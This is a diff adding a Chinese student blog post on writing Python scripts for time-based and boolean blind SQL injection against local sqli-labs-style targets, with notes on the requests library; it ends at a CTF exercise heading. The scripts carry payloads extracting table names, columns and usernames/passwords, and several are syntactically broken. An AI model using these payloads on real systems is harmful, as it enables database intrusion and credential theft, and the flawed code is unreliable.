@@ -1,0 +1,1410 @@
+<!DOCTYPE HTML>
+<html lang="en">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="sql盲注题, shiango">
+    <meta name="description" content="A Freshman">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>sql盲注题 | shiango</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery.min.js"></script>
+
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="shiango" type="application/atom+xml">
+</head>
+
+
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">shiango</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>Index</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>Tags</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>Categories</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>Archives</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>About</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>Contact</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>Friends</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="Search" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">shiango</div>
+        <div class="logo-desc">
+            
+            A Freshman
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			Index
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			Tags
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			Categories
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			Archives
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			About
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			Contact
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			Friends
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/20.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">sql盲注题</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        padding: 35px 0 15px 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        padding-bottom: 30px;
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/sqli%E7%9B%B2%E6%B3%A8/">
+                                <span class="chip bg-color">sqli盲注</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
+                    2022-04-06
+                </div>
+                
+
+                
+
+                
+
+                
+
+                
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="sql脚本编写"><a href="#sql脚本编写" class="headerlink" title="sql脚本编写"></a>sql脚本编写</h1><p>因为sql盲注注入正常题目都得用到python的脚本，然后自己的编程又没有系统的学习过，所以想来学学脚本的编写应用，补上这一块漏洞，毕竟等到学校教python都是下学期的事了。</p>
+<h2 id="1-脚本学习记录"><a href="#1-脚本学习记录" class="headerlink" title="1.脚本学习记录"></a>1.脚本学习记录</h2><p>sql脚本算法是类似的，主要是waf的判断，绕过的选择，以及选择最优解决。</p>
+<h3 id="1-一些琐碎的理论知识："><a href="#1-一些琐碎的理论知识：" class="headerlink" title="1.一些琐碎的理论知识："></a>1.一些琐碎的理论知识：</h3><p>1.302–&gt;跳转页面状态码</p>
+<p>2.</p>
+<p><img src="/images/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202022-04-06%20212324.png" alt="屏幕截图 2022-04-06 212324"></p>
+<p>headers：这里的头部其实就是bp里面的http回显响应头，注意一下写法就可以。</p>
+<p>data：传递的数据，字典的形式</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r =requests.post(url=url,headers=headers,data=data,allow_redirects=False)</span><br></pre></td></tr></table></figure>
+
+<p>防止重定向的allow_redirects=False的操作是一定要做的切记。</p>
+<p>简单的雏形：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">import re  #re模块使 Python 语言拥有全部的正则表达式功能</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = &#x27;http://127.0.0.1/index.php?page=login.php&#x27;</span><br><span class="line"># headers = &#123;</span><br><span class="line">#</span><br><span class="line"># &#125;</span><br><span class="line">#</span><br><span class="line"># data = &#123;</span><br><span class="line">#     &#x27;user&#x27;:&#x27;admin&#x27;,</span><br><span class="line">#     &#x27;password&#x27;:&#x27;123&#x27;</span><br><span class="line"># &#125;</span><br><span class="line">#</span><br><span class="line"># #&#x27; or length(database())&gt;1</span><br><span class="line"># r =requests.post(url=url,headers=headers,data=data,allow_redirects=False)</span><br><span class="line"># print(r.status_code)</span><br><span class="line"># print(r.text)</span><br><span class="line"></span><br><span class="line">#判断当前数据库长度</span><br><span class="line"># def get_database_lenth():</span><br><span class="line">#     for i in range(20):</span><br><span class="line">#         data = &#123;</span><br><span class="line">#             &#x27;user&#x27;: &quot;&#x27; or length(database())&gt;=&quot;+str(i)+&quot;#&quot;,</span><br><span class="line">#             &#x27;password&#x27;: &#x27;123&#x27;</span><br><span class="line">#         &#125;</span><br><span class="line">#         print(data)</span><br><span class="line">#</span><br><span class="line">#      r_database_lenth = requests.post(url=url,headers=headers,data=data,allow_redirects=False)</span><br><span class="line">#      print(r_database_lenth.status_code)</span><br><span class="line">#      if r_database_lenth.status_code == 302:</span><br><span class="line">#         print(&#x27;[+] current database lenth:&#123;&#125;&#x27;.format(i))</span><br><span class="line">#         return i</span><br><span class="line"># database_lenth = get_database_lenth()</span><br><span class="line">#database_lenth = 10</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#获取当前数据库名称</span><br><span class="line">def get_database_name(lenth=10)</span><br><span class="line">    for i in range(1,length+1):</span><br><span class="line">        for j in &quot;abcdefghijklmnopqrstuvwxyz1234567890&quot;:</span><br><span class="line">            username = &quot;&#x27; or left(database(), &quot;+str(i) +&quot; ) =&quot;+ database_name+str(j) +&quot;#&quot;</span><br><span class="line">        print(username)</span><br><span class="line">        database_name += j</span><br><span class="line"></span><br><span class="line">#get_database_name()</span><br><span class="line">        data = &#123;</span><br><span class="line"></span><br><span class="line">             &#x27;username&#x27;:database_name</span><br><span class="line">             &#x27;user&#x27;: &quot;&#x27; or length(database())&gt;=&quot;+str(i)+&quot;#&quot;,</span><br><span class="line">             &#x27;password&#x27;: &#x27;123&#x27;</span><br><span class="line">         &#125;</span><br><span class="line">        database_name_r = requests.post(url=url,headers=headers,data=data,allow_redirects=False)</span><br><span class="line">        if database_name_r.status_code == 302:</span><br><span class="line">            database_name += str(i)</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">        if database_name != &#x27;&#x27;:</span><br><span class="line">            print(database_name)</span><br><span class="line">print(get_database_name)</span><br><span class="line">return get_database_name</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-note"><a href="#2-note" class="headerlink" title="2.note"></a>2.note</h3><h4 id="（1）-requests库"><a href="#（1）-requests库" class="headerlink" title="（1）.requests库"></a>（1）.requests库</h4><p>(1)请求</p>
+<p>发送一个http请求，基本可以满足http测试需求：</p>
+<p>安装库：pip install requests</p>
+<p>导入库: import requests</p>
+<p>e.g:</p>
+<p>import requests</p>
+<p>url = “<a target="_blank" rel="noopener" href="http://xxxx&quot;/">http://xxxx&quot;</a></p>
+<p>re = request.get(url)#发送一个get请求，返回值是一个response的实例</p>
+<p>print(re)#打印状态信息</p>
+<p>data = {‘id’:1}</p>
+<p>#可以用get方式传递参数，参数可以用字符串，元组，字典等方式提交</p>
+<p>re1 = request.get(url,data)</p>
+<p>print(re1)</p>
+<h4 id="（2）响应"><a href="#（2）响应" class="headerlink" title="（2）响应"></a>（2）响应</h4><p>返回了一个Response的实例，现在就可以调用其来查看有关于GET请求结果的全部信息。</p>
+<h5 id="一、响应码（-status-code）"><a href="#一、响应码（-status-code）" class="headerlink" title="一、响应码（.status_code）:"></a>一、响应码（.status_code）:</h5><p>200</p>
+<p>404</p>
+<p>302</p>
+<p>e.g:</p>
+<p>import requests</p>
+<p>url = “<a target="_blank" rel="noopener" href="http://xxxx&quot;/">http://xxxx&quot;</a></p>
+<p>r = requests.get(url)</p>
+<p>code = r.status_code</p>
+<p>if code :</p>
+<p>   print(“success”)</p>
+<p>#在条件表达式里面直接用response实例，200~400为true</p>
+<h5 id="二-响应内容（-text）"><a href="#二-响应内容（-text）" class="headerlink" title="二.响应内容（.text）:"></a>二.响应内容（.text）:</h5><p>import requests</p>
+<p>url = “<a target="_blank" rel="noopener" href="http://xxxx&quot;/">http://xxxx&quot;</a></p>
+<p>parms = {‘id’:’1’}</p>
+<p>r = requests.get(url,parms)</p>
+<p>text = r.text</p>
+<p>content = r.content</p>
+<p>json = r.json</p>
+<h5 id="三-响应编码（-encoding-："><a href="#三-响应编码（-encoding-：" class="headerlink" title="三.响应编码（.encoding)："></a>三.响应编码（.encoding)：</h5><p>#查询当前页面是什么编码，可以修改为自己想要的编码</p>
+<p>r.encoding = ‘utf-8’</p>
+<p>print(r.encoding)</p>
+<h5 id="四-响应头（r-headers"><a href="#四-响应头（r-headers" class="headerlink" title="四.响应头（r.headers):"></a>四.响应头（r.headers):</h5><p>在get请求里自定义头部信息，用字典的形式传递参数即可</p>
+<p>header = {‘user-agent’:’my_test/0001’}</p>
+<p>result = requests.get(url,headers=header)</p>
+<p>print(r.headers)</p>
+<p>以下内容摘自<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_46436640/article/details/119295539?ops_request_misc=%7B%22request_id%22:%22164924975216781683960378%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=164924975216781683960378&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-2-119295539.142%5Ev5%5Epc_search_result_cache,157%5Ev4%5Econtrol&utm_term=sql%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC%E7%9A%84%E7%BC%96%E5%86%99&spm=1018.2226.3001.4187">(55条消息) sql盲注脚本编写_Ph03n1x丶的博客-CSDN博客_sql盲注脚本</a></p>
+<h3 id="3-盲注脚本编写"><a href="#3-盲注脚本编写" class="headerlink" title="3.盲注脚本编写"></a>3.盲注脚本编写</h3><h3 id="（1）时间盲注"><a href="#（1）时间盲注" class="headerlink" title="（1）时间盲注"></a>（1）时间盲注</h3><p>if的利用</p>
+<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IF( expr1 , expr2 , expr3 )</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>expr1 的值为 TRUE，则返回值为 expr2<br>expr1 的值为FALSE，则返回值为 expr3</p>
+<p>第一种：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">#时间盲注</span><br><span class="line">import requests</span><br><span class="line">#引库</span><br><span class="line"></span><br><span class="line">#设置内容</span><br><span class="line">url = &quot;http://127.0.0.1/sqllib/&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def payload(i,j):</span><br><span class="line">    #分别想要对字符串截取的第i位和截取字符的ascii值作为两个参数</span><br><span class="line"></span><br><span class="line">    #库名</span><br><span class="line">    #sql = &quot;1&#x27; and if(ascii(substr(database(),%d,1)) = %d,sleep(3),1)-- &quot;%(i,j)</span><br><span class="line"></span><br><span class="line">    #表名</span><br><span class="line">    #sql = &quot;1&#x27; and if(ascii(substr(select group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1)) = %d,sleep(3),1)-- &quot;%(i,j)</span><br><span class="line"></span><br><span class="line">    #列名</span><br><span class="line">    #sql = &quot;1&#x27; and if(ascii(substr(select group_concat(column_name) from information_schema.columns where table_name = &#x27;user&#x27;),%d,1))= %d,sleep(3),1)-- &quot;%(i,j)</span><br><span class="line"></span><br><span class="line">    #字段名</span><br><span class="line">    #sql = &quot;1&#x27; and if(ascii(substr(select group_concat(username,password) from users),%d,1))=%d,sleep(3),1)-- &quot;%(i,j)</span><br><span class="line"></span><br><span class="line">    #写一个字典，作为get的参数</span><br><span class="line">    parms = &#123;&#x27;id&#x27;:sql&#125;</span><br><span class="line">    r = requests.get(url=url,params=parms)</span><br><span class="line">    #判断这个请求的响应时间是否大于2</span><br><span class="line">    if r.elapsed.total_seconds()&gt;2:</span><br><span class="line">        flag = 1</span><br><span class="line">    else:</span><br><span class="line">        flag = 0</span><br><span class="line">    return flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def time_blind():</span><br><span class="line">    result = &quot;&quot;</span><br><span class="line">    for i in range(1,100):</span><br><span class="line"># j从0开始的原因，是为了让函数检查到空白字符就要停止继续检查了，因为开始测试的时候我j是从字母A开始直到z结束的，如果不检查空白，会出现一直循环直到循环100次为止</span><br><span class="line">        j = 0</span><br><span class="line">        while j &lt;127:</span><br><span class="line">            flag = payload(i,j)</span><br><span class="line">            if flag:</span><br><span class="line">                break</span><br><span class="line">            else:</span><br><span class="line">                 j = j+1</span><br><span class="line">            char = j</span><br><span class="line">            # 如果遇到空白即检查完毕，那么直接跳出循环</span><br><span class="line">            if char == 0:</span><br><span class="line">                break</span><br><span class="line">                # 如果出现不可打印字符就直接跳过，因为我没加限制条件测试的时候，可能会出现爆破错误的情况</span><br><span class="line">            elif 1&lt;= char &lt;= 31:</span><br><span class="line">                continue</span><br><span class="line">            # 将猜解成功的ASCII码转换为字符打印</span><br><span class="line">            result += chr(char)</span><br><span class="line">            print(result)</span><br><span class="line">            </span><br><span class="line">time_blind()            </span><br></pre></td></tr></table></figure>
+
+<p>分析：</p>
+<p>1.主要是一个def payload的里面的内容可以灵活更改：请求方式，注入方法，注入点，</p>
+<p>2.定义time_blind函数</p>
+<p>3.python不需要定义数据类型</p>
+<p>第二种：</p>
+<p>这里就是让i和j在字符串里面寻找，这样就不用在ascii码表里面遍历一遍，节约时间</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">def time_blind():</span><br><span class="line">    res =&quot;&quot;</span><br><span class="line">    url = &quot;http://127.0.0.1/sqlilabs&quot;</span><br><span class="line">    dict_char =&quot;1234567890abcdefghijklmnopqrstuvwxyz,!&quot;</span><br><span class="line">    for i in range(1,100):</span><br><span class="line">        for j in dict_char:</span><br><span class="line">            sql = &quot;1&#x27; and if((substr(database(),%d,1) = &#x27;%c&#x27;,sleep(3),1)-- &quot;%(i,j)</span><br><span class="line">            parms = &#123;&#x27;id&#x27;:sql&#125;</span><br><span class="line">            r = requests.get(url,parms)</span><br><span class="line">            if r.elapsed.total_seconds()&gt;2:</span><br><span class="line">                char = j</span><br><span class="line">                res += char</span><br><span class="line">                print(res)</span><br><span class="line">                break</span><br><span class="line">        if j ==&#x27;!&#x27;:</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>
+
+<h3 id="（2）布尔盲注"><a href="#（2）布尔盲注" class="headerlink" title="（2）布尔盲注"></a>（2）布尔盲注</h3><p>不需要等待时间，只需要判断页面的回显情况是逻辑正确还是逻辑错误即可，爆破速度会快很多</p>
+<p>payload中if（xxx,1,0）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">#1.引入一个库</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">#2.padload传入及其内容</span><br><span class="line">url = &quot;http://127.0.0.1&quot;</span><br><span class="line">dic = &quot;1234567890abcdefghijklmnopqrstuvwxyz&quot;</span><br><span class="line">for i in range(1,100):</span><br><span class="line">    for j in dic:</span><br><span class="line">        # 库名</span><br><span class="line">        # sql = &quot;1&#x27; and if((substr(database(),%d,1)) = &#x27;%c&#x27;, 1, 0) -- &quot; % (i, j)</span><br><span class="line">        # 表名</span><br><span class="line">        # sql = &quot;1&#x27; and if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1)=&#x27;%c&#x27;,1,0) -- &quot;% (i, j)</span><br><span class="line">        # 字段名</span><br><span class="line">        sql = &quot;1&#x27; and if(substr((select group_concat(column_name) from information_schema.columns where table_schema = database() and table_name = &#x27;users&#x27;),%d,1)=&#x27;%c&#x27;,1,0) -- &quot; % (</span><br><span class="line">        i, j)</span><br><span class="line">        # 字段值</span><br><span class="line">        # sql =&quot;1&#x27; and if(substr((select group_concat(username) from users),%d,1)= &#x27;%c&#x27;,1,0) -- &quot;% (i, j)</span><br><span class="line">        # sql =&quot;1&#x27; and if(substr((select group_concat(password) from users),%d,1)= &#x27;%c&#x27;,1,0) -- &quot;% (i, j)</span><br><span class="line">        parm = &#123;&#x27;id&#x27;: sql&#125;</span><br><span class="line">        r = requests.get(url=url, params=parm)</span><br><span class="line">        # 只要判断逻辑正确的标志出现，即可打印结果</span><br><span class="line">        </span><br><span class="line">#3.回显内容        </span><br><span class="line">res = &quot;&quot;        </span><br><span class="line">        if &quot;You are in&quot; in r.text:</span><br><span class="line">            res += j</span><br><span class="line">            print(res)</span><br><span class="line">            break</span><br><span class="line">    if j == &#x27;!&#x27;:</span><br><span class="line">        break</span><br></pre></td></tr></table></figure>
+
+<h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3><p>所以盲注类简单脚本编写应该是这样的流程：</p>
+<p>1.先引入一个requests</p>
+<p>2.再编写一个注入内容（payload）</p>
+<p>3.响应内容</p>
+<h2 id="相关题目"><a href="#相关题目" class="headerlink" title="相关题目"></a>相关题目</h2><h5 id="1-ctfhubsql布尔盲注题：get-id-字典法"><a href="#1-ctfhubsql布尔盲注题：get-id-字典法" class="headerlink" title="1.ctfhubsql布尔盲注题：get,id,字典法"></a>1.ctfhubsql布尔盲注题：get,id,字典法</h5><p>先猜一下：注入点、注入方式，位字段。</p>
+<p>sql中不区分大小写</p>
